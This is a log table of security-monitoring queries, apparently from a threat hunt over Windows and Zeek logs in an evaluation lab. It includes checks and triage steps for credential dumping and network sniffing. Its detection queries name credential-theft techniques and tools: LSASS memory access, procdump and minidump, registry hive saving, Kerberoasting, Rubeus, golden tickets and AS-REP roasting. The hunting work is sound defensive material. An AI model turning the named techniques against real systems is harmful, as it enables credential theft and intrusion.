| q-60cb58bab0 | check C290 (repaired) | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE TO_LOWER(win.ScriptBlockText) LIKE \"*arp*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*netsh interface*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*get-netneighbor*\" OR TO_LOWER(win.S… | 0 |  |
| q-2fc3dfae7c | check C291 | search | {"dataset": "windows.other", "query": "event.code:3 OR event.code:22 OR event.code:4663 OR event.code:4670", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executa… | 2 |  |
| q-e2137201ce | check C292 | aggregate | {"dataset": "zeek", "field": "zeek.orig_l2_addr", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 613 |  |
| q-2455a7bdea | check C293 | aggregate | {"dataset": "zeek", "field": "zeek.resp_l2_addr", "query": "event.action:conn", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 613 |  |
| q-e87428a176 | check C294 | search | {"dataset": "windows.other", "query": "event.code:(1341 OR 1342 OR 1020 OR 1063)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_lin… | 0 |  |
| q-63bed30320 | check C295 | aggregate | {"dataset": "windows.other", "field": "event.code", "query": "*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 216 |  |
| q-ad0d02e534 | check C296 | search | {"dataset": "windows.security", "query": "event.code:5156 AND win.Direction:Inbound", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_… | 0 |  |
| q-f1ecd41c1b | check C297 | aggregate | {"dataset": "windows.sysmon", "field": "destination.port", "query": "event.code:3", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1229 |  |
| q-cc1e135e51 | check C298 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:(*Dhcp* OR *dhcp*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.… | 0 |  |
| q-068d10ccfc | check C299 | aggregate | {"dataset": "zeek", "field": "event.action", "query": "*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 2140 |  |
| q-e81ca6ddf2 | check C300 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4672", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 212 |  |
| q-dd371a6649 | check C301 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 297 |  |
| q-9c96c6ef4a | check C302 | search | {"dataset": "windows.security", "query": "event.code:4634", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 236 |  |
| q-341b31f98b | check C303 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-6ffa4bc62f | check C304 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-5bfe7b8b4e | check C305 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:(*kerberos* OR *Kerberos* OR *ticket* OR *Ticket*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name",… | 0 |  |
| q-e2890d3be4 | check C306 | search | {"dataset": "windows.other", "query": "event.code:(7045 OR 7040)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip",… | 9 |  |
| q-5f404eb5b7 | check C307 | aggregate | {"dataset": "zeek", "field": "zeek.request_type", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-72b2aa705b | check C308 | search | {"dataset": "windows.security", "query": "event.code:4769", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 28 |  |
| q-9a67a00848 | check C309 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4672", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 212 |  |
| q-d10f2ee863 | check C310 | aggregate | {"dataset": "windows.security", "field": "win.TicketEncryptionType", "query": "event.code:4769", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 28 |  |
| q-021485fde5 | check C311 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-cfa208c62d | check C312 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:(*golden* OR *Golden* OR *krbtgt* OR *KRBTGT*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "pr… | 0 |  |
| q-70efab7b8d | check C313 | aggregate | {"dataset": "windows.other", "field": "event.code", "query": "*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 216 |  |
| q-ed6c7f1bb5 | check C314 | aggregate | {"dataset": "zeek", "field": "zeek.request_type", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-2fae4a49c8 | check C315 | search | {"dataset": "windows.security", "query": "event.code:4769", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 28 |  |
| q-68b4d2d8f5 | check C316 | aggregate | {"dataset": "windows.security", "field": "win.ServiceName", "query": "event.code:4769", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 28 |  |
| q-8f028cd6a2 | check C317 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4672", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 212 |  |
| q-118fe6e9fe | check C318 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-2658ada07e | check C319 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:(*silver* OR *Silver* OR *service ticket* OR *SPN*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name"… | 0 |  |
| q-6dc6f51e57 | check C320 | search | {"dataset": "windows.other", "query": "event.code:(7045 OR 7040)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip",… | 9 |  |
| q-782cb54b21 | check C321 | aggregate | {"dataset": "zeek", "field": "zeek.request_type", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-c30ea8a269 | check C322 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4769", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 28 |  |
| q-b21e8ba573 | check C323 | aggregate | {"dataset": "windows.security", "field": "win.TicketEncryptionType", "query": "event.code:4769", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 28 |  |
| q-4335cf84f1 | check C324 | search | {"dataset": "windows.security", "query": "event.code:4648", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 15 |  |
| q-2b379ac7a8 | check C325 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4624", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 297 |  |
| q-a621887daa | check C326 | aggregate | {"dataset": "windows.sysmon", "field": "win.TargetImage", "query": "event.code:10", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 39283 |  |
| q-80a7064628 | check C327 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:(*Kerberoast* OR *kerberoast* OR *Invoke-Kerberoast* OR *Rubeus*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code… | 0 |  |
| q-ef4c862501 | check C328 | aggregate | {"dataset": "windows.other", "field": "event.code", "query": "*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 216 |  |
| q-c44866849e | check C329 | aggregate | {"dataset": "zeek", "field": "zeek.request_type", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-4a1656622f | check C330 | search | {"dataset": "windows.security", "query": "event.code:4768", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source.ip", "desti… | 14 |  |
| q-ed0afa7d9f | check C331 | aggregate | {"dataset": "windows.security", "field": "win.PreAuthType", "query": "event.code:4768", "time_from": null, "time_to": null, "size": 20, "sub_field": null} | 14 |  |
| q-ab4d2f67c8 | check C332 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4768", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 14 |  |
| q-8a1509fb9d | check C333 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 447 |  |
| q-8f79c1bb07 | check C334 | search | {"dataset": "windows.powershell", "query": "powershell.script_block_text:(*AS-REP* OR *asrep* OR *GetNPUsers* OR *DontRequirePreAuth*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "… | 0 |  |
| q-b22c867ae7 | check C335 | aggregate | {"dataset": "windows.other", "field": "event.code", "query": "*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 216 |  |
| q-1d2ec9e662 | check C336 | aggregate | {"dataset": "zeek", "field": "zeek.request_type", "query": "event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 35 |  |
| q-ef19cc5144 | check C337 | aggregate | {"dataset": "windows.security", "field": "win.LogonProcessName", "query": "event.code:4624 OR event.code:4648", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 312 |  |
| q-da05134011 | check C338 | aggregate | {"dataset": "windows.sysmon", "field": "win.GrantedAccess", "query": "event.code:10 AND win.TargetImage:*lsass*", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 326 |  |
| q-b41ba27a5a | check C339 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*cookie* OR powershell.script_block_text:*token* OR powershell.script_block_text:*SAML*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "… | 0 |  |
| q-ccd9ebecd1 | check C340 | search | {"dataset": "windows.other", "query": "event.code:7045 OR event.code:5857 OR event.code:5858", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 90 | F50 |
| q-444ee6b324 | check C341 | aggregate | {"dataset": "zeek", "field": "event.action", "query": "event.action:http OR event.action:ssl OR event.action:kerberos", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 475 |  |
| q-4f38357c6b | check C342 | aggregate | {"dataset": "windows.sysmon", "field": "file.path", "query": "event.code:11 AND (file.path:*cookie* OR file.path:*Cookies*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1 |  |
| q-bf37d9325f | check C343 | aggregate | {"dataset": "windows.security", "field": "win.LogonProcessName", "query": "event.code:4624 OR event.code:4648", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 312 |  |
| q-80a4b9f655 | check C344 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*cookie* OR powershell.script_block_text:*Set-Cookie* OR powershell.script_block_text:*session*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.… | 0 |  |
| q-6304398277 | check C345 | search | {"dataset": "windows.other", "query": "event.code:11 OR event.code:16", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "source… | 9 |  |
| q-a071ad5bd3 | check C346 | search | {"dataset": "zeek", "query": "event.action:http AND http.request.method:*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process.command_line", "so… | 62 |  |
| q-cb699a750c | check C347 | aggregate | {"dataset": "windows.security", "field": "win.LogonProcessName", "query": "event.code:4624 OR event.code:4648", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 312 |  |
| q-83aa43a36b | check C348 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*SAML* OR powershell.script_block_text:*NotOnOrAfter* OR powershell.script_block_text:*Assertion*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "hos… | 0 |  |
| q-3d6388e207 | check C349 | search | {"dataset": "windows.other", "query": "event.code:7045 OR event.code:5857 OR event.code:5858", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 90 |  |
| q-6b0c80f404 | check C350 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*saml* OR process.command_line:*token* OR process.command_line:*cert*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-0d2d3aa0d8 | check C351 | search | {"dataset": "zeek", "query": "event.action:http AND (url.original:*saml* OR url.original:*adfs* OR url.original:*token*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "p… | 0 |  |
| q-2e3c33bd81 | check C352 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-1c738d038c | check C353 | aggregate | {"dataset": "windows.security", "field": "win.LogonType", "query": "event.code:4625", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-906ee6311e | check C354 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*MFA* OR powershell.script_block_text:*2FA* OR powershell.script_block_text:*Authenticator*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name… | 0 |  |
| q-3a620dc8b0 | check C355 | search | {"dataset": "windows.other", "query": "event.code:4625 OR event.code:5857 OR event.code:5858", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 85 | F53 |
| q-54086e582b | check C356 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1 AND (process.command_line:*login* OR process.command_line:*auth* OR process.command_line:*mfa*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 0 |  |
| q-58748c3fbe | check C357 | search | {"dataset": "zeek", "query": "event.action:http AND (url.original:*login* OR url.original:*auth* OR url.original:*mfa*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "pr… | 0 |  |
| q-fb662925dd | check C358 | aggregate | {"dataset": "windows.security", "field": "win.ObjectName", "query": "event.code:4657", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 36 |  |
| q-2030988752 | check C359 | aggregate | {"dataset": "windows.security", "field": "win.TargetUserName", "query": "event.code:4768", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 14 |  |
| q-d597d3f401 | check C360 | aggregate | {"dataset": "windows.sysmon", "field": "registry.path", "query": "event.code:13 AND (registry.path:*Certificate* OR registry.path:*Crypto* OR registry.path:*Keys*)", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 1133 |  |
| q-784e71a054 | check C361 | search | {"dataset": "windows.powershell", "query": "event.code:4104 AND (powershell.script_block_text:*Certificate* OR powershell.script_block_text:*Export-PfxCertificate* OR powershell.script_block_text:*New-SelfSignedCertificate*)", "time_from": null, "time_to": nul… | 0 |  |
| q-7c6dd42d75 | check C362 | search | {"dataset": "windows.other", "query": "event.code:7045 OR event.code:5857 OR event.code:5858", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.name", "process.executable", "process… | 90 |  |
| q-f1f251b8f7 | check C363 | aggregate | {"dataset": "zeek", "field": "zeek.certificate_subject", "query": "event.action:x509", "time_from": null, "time_to": null, "size": 50, "sub_field": null} | 378 |  |
| q-71120708a1 | triage T1003 step 1 | search | {"dataset": "windows.sysmon", "query": "event.code:10 AND win.TargetImage:*lsass* AND NOT win.GrantedAccess:(0x1000 OR 0x1400)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "user.nam… | 9 |  |
| q-d2f023679a | triage T1003 step 1 | search | {"dataset": "windows.security", "query": "event.code:(4656 OR 4663 OR 4670) AND win.ObjectType:(SAM_DOMAIN OR SAM_SERVER OR SAM_ALIAS OR Process OR Unknown)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dat… | 47 |  |
| q-221db1973c | triage T1003 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None | F01 |
| q-f4c91f1866 | triage T1003 step 2 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None | F01 |
| q-c765642fd9 | triage T1003 step 2 | search | {"dataset": "windows.security", "query": "event.code:(4656 OR 4663 OR 4670) AND win.ObjectType:(SAM_DOMAIN OR SAM_SERVER OR SAM_ALIAS)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "… | 21 | F02 |
| q-c4605474b4 | triage T1003 step 3 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == 4104 AND (TO_LOWER(win.ScriptBlockText) LIKE \"*lsass*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*minidump*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*procdump*\" OR TO… | ERROR |  |
| q-6a8e3e5fe4 | triage T1003 step 3 | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuWmZPb"} | None | F02 |
| q-5d6af140d6 | triage T1003 step 4 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND (TO_LOWER(win.ScriptBlockText) LIKE \"*lsass*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*minidump*\" OR TO_LOWER(win.ScriptBlockText) LIKE \"*procdump*\" O… | 9 |  |
| q-7be1c5b6d5 | triage T1003 step 4 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND process.executable:*powershell*", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "process.command_line", "process.parent.executable"], "size": 20, "sort": "asc"} | 12 |  |
| q-d72386d7f2 | triage T1003 step 5 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByUbwus"} | None | F01 |
| q-e2aa0bd87d | triage T1003 step 5 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByEVwPJ"} | None |  |
| q-35c9c23f8b | triage T1003 step 6 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRZ7r-"} | None |  |
| q-a4a0f1689c | triage T1003 step 6 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None | F05 |
| q-1b089cc4d1 | triage T1003 step 6 | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByCVtlI"} | None | F01 |
| q-a2daf30fcc | triage T1003 step 7 | esql | {"query": "FROM logs-windows.powershell-default METADATA _id, _index \| WHERE event.code == \"4104\" AND host.name == \"scranton.dmevals.local\" AND @timestamp >= \"2020-05-02T03:04:00.000Z\" AND @timestamp <= \"2020-05-02T03:06:30.000Z\" \| KEEP @timestamp, u… | 20 | F05 |
| q-0acd12cb58 | triage T1003 step 7 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBjA9g2o"} | None | F05 |
| q-b56cabc5da | triage T1003 step 8 | esql | {"query": "FROM logs-windows.security-default METADATA _id, _index \| WHERE event.code == \"4662\" OR (event.code == \"4688\" AND (TO_LOWER(process.command_line) LIKE \"*dump*\" OR TO_LOWER(process.command_line) LIKE \"*reg save*\" OR TO_LOWER(process.command_… | 7 | F04 |
| q-0f911b40f2 | triage T1003 step 8 | search | {"dataset": "windows.sysmon", "query": "event.code:11 AND (file.path:*.dmp OR file.path:*.zip OR file.path:*.7z OR file.path:*hive*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "observer.name", "event.dataset", "event.code", "us… | 12 | F05 |
| q-c2f5794894 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-cec0efdbbc | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoMQUXI"} | None |  |
| q-cb7edb8639 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-15c013eea3 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBn663fz"} | None |  |
| q-81059daac4 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByCVtlI"} | None |  |
| q-6a23ab74a4 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByUbwus"} | None |  |
| q-c5c79ab386 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoLO1t-"} | None |  |
| q-ef80e9b084 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuWmZPb"} | None |  |
| q-42039e7c45 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuWmZPb"} | None |  |
| q-155860c9c0 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuWmZPb"} | None |  |
| q-123ae1316d | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuv695R"} | None |  |
| q-fea5b48c1d | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBizx7sV"} | None |  |
| q-379cf34873 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBox14nu"} | None |  |
| q-dcb154a5eb | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBox14nu"} | None |  |
| q-2fdfa573c1 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBumw-cX"} | None |  |
| q-38fa70e354 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBumw-cX"} | None |  |
| q-2d18257826 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoglALi"} | None |  |
| q-a2790def68 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByPYrDh"} | None |  |
| q-9134fb2a8c | triage T1003 verify | get_event | {"index": ".ds-logs-windows.powershell-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeByRaLqc"} | None |  |
| q-08ab046710 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBjA9g2o"} | None |  |
| q-a7e5c67827 | triage T1003 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnxyHFB"} | None |  |
| q-fd356dc0f1 | triage T1040 step 1 | search | {"dataset": "windows.security", "query": "event.code:4688 AND (process.executable:*NetworkWatcher* OR process.executable:*PsExec* OR process.executable:*sdelete* OR process.executable:*python.exe OR process.executable:*logman*)", "time_from": null, "time_to": … | 26 | F07 |
| q-761ab6ec87 | triage T1040 step 1 | aggregate | {"dataset": "windows.sysmon", "field": "process.executable", "query": "event.code:1", "time_from": null, "time_to": null, "size": 100, "sub_field": null} | 447 |  |
| q-be5845acd0 | triage T1040 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.executable:*NetworkWatcher* OR process.executable:*python.exe OR process.executable:*logman*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "process.ex… | 16 | F06 |
| q-d4a43664e4 | triage T1040 step 2 | search | {"dataset": "windows.sysmon", "query": "event.code:3 AND (process.executable:*python* OR process.executable:*NetworkWatcher* OR process.executable:*logman*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "process.execu… | 348 | F07 |
| q-44aa419321 | triage T1040 step 3 | aggregate | {"dataset": "windows.sysmon", "field": "destination.port", "query": "event.code:3 AND process.executable:*python.exe", "time_from": null, "time_to": null, "size": 20, "sub_field": "destination.ip"} | 348 |  |
| q-53bcfdf7e1 | triage T1040 step 3 | search | {"dataset": "windows.other", "query": "event.code:7045 OR event.code:7040 OR event.code:7036", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "event.code", "win.ServiceName", "win.ImagePath", "win.ServiceType", "win.Serv… | 17 |  |
| q-03ed46b14a | triage T1040 step 4 | search | {"dataset": "windows.other", "query": "event.code:7040 OR event.code:7045 OR event.code:7036", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "event.code", "win.ServiceName", "win.ImagePath", "win.ServiceType", "win.Serv… | 17 | F06 |
| q-3884d8228a | triage T1040 step 4 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND (process.command_line:*ndis* OR process.command_line:*NetworkWatcher* OR process.command_line:*netsh* OR process.command_line:*pktmon*)", "time_from": null, "time_to": null, "fields": ["@timestamp", "hos… | 7 | F06 |
| q-b78933c5fd | triage T1040 step 5 | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoy3l7-"} | None | F07 |
| q-55b926b8cb | triage T1040 step 5 | search | {"dataset": "windows.sysmon", "query": "event.code:1 AND process.executable:*python.exe AND host.name:nashua.dmevals.local", "time_from": null, "time_to": null, "fields": ["@timestamp", "host.name", "user.name", "event.code", "process.executable", "process.com… | 5 |  |
| q-3d5023170c | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnvvDAD"} | None |  |
| q-6d338066b0 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnvvDAD"} | None |  |
| q-0cc585a080 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnaXZbG"} | None |  |
| q-671d0656c6 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnkjXIW"} | None |  |
| q-d8519b7d6c | triage T1040 verify | get_event | {"index": ".ds-logs-windows.other-default-2026.10.22-000001", "id": "AaFiKJc9VXKkeBwdMB1J"} | None |  |
| q-fc48a830a1 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnFCvgF"} | None |  |
| q-695a9dbaab | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoy3l7-"} | None |  |
| q-0bb5d13a8f | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBoy3l7-"} | None |  |
| q-da19de1df9 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnyzTy7"} | None |  |
| q-6e812719d5 | triage T1040 verify | get_event | {"index": ".ds-logs-windows.sysmon-default-2026.10.22-000001", "id": "AaFiJpc9VXKkeBnyzTy7"} | None |  |
| q-0319cff10b | triage T1040 verify | get_event | {"index": ".ds-logs-windows.security-default-2026.10.22-000001", "id": "AaFiJ5c9VXKkeBuu5GRt"} | None |  |
